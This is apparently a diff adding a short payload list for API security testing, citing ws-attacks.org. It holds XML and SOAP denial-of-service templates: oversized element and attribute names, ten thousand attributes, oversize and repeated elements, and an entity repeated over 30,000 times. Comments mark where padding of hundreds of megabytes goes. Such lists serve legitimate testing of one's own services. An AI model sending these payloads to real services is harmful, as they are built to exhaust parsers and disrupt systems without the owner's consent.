@@ -1,0 +1,12 @@
+#API Testing Payloads
+#https://www.ws-attacks.org/Welcome_to_WS-Attacks
+
+<XXXXX<!--continue until it reaches a size of a few hundred MB-->XXXXX><!--Value XY--></XXXXX<!--continued until it reaches a size of a few hundred MB-->XXXXX>
+<soap:Body><ns:Prefix Attack="XXXXXX<!--Attribute name continued until it reaches a size of a few hundred MB-->XXXX"></ns:Prefix>
+<soap:Body><ns:Prefix Attack_1="XXXXXX" <!-- Attribute Attack_2 till Attack_9999 --> Attack_10000="XXXXXX" ></ns:Prefix>
+<soap:Value>20</soap:Value>
+<item xsi:type="xsd:string">Data1</item>
+<oversize>oversizedDataHere</oversize>
+<oversize><item1>x</item1><item1>x</item1><item1>x</item1></oversize>
+<item xsi:type="xsd:string">Data1</item><item xsi:type="xsd:string">Data2</item><item xsi:type="xsd:string">Data3</item>
+<ns1:reverse><s>&x;&x;<!-- repeat the entity for more than 30,000 times --></s></ns1:reverse>
